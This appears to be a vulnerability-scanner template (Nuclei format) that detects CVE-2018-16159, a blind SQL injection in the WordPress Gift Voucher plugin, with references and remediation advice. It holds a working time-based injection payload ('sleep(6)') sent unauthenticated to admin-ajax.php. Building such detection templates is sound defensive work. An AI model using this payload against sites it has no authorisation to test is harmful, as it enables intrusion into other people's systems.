id: CVE-2018-16159
info:
  name: WordPress Gift Voucher <4.1.8 - Blind SQL Injection
  author: theamanrawat
  severity: critical
  description: The WordPress Gift Vouchers plugin before 4.1.8 has a blind SQL injection
    vulnerability that allows an attacker to access sensitive information and execute
    unauthorized operations on the affected site.
  reference:
  - https://wpscan.com/vulnerability/9117
  - https://wordpress.org/plugins/gift-voucher/
  - https://www.exploit-db.com/exploits/45255/
  - https://nvd.nist.gov/vuln/detail/CVE-2018-16159
  remediation: Fixed in version 4.1.8.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-16159
    cwe-id: CWE-89
  metadata:
    verified: 'true'
    impact: The blind SQL injection vulnerability in WordPress Gift Vouchers plugin
      before 4.1.8 can allow an attacker to acquire confidential information, manipulate
      data, and execute unauthorized administrative actions on the affected website.
    recommendation: It is recommended to update to WordPress Gift Voucher plugin version
      4.1.8 or later to prevent the blind SQL injection vulnerability and potential
      unauthorized access to sensitive data.
  tags: sqli,wordpress,unauth,wp,gift-voucher,cve2018,edb,wpscan,cve,wp-plugin
requests:
- raw:
  - '@timeout: 10s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=wpgv_doajax_front_template&template_id=1 and sleep(6)#

    '
  matchers:
  - type: dsl
    dsl:
    - duration>=6
    - status_code == 200
    - contains(content_type, "application/json")
    - contains(body, "images") && contains(body, "title")
    condition: and
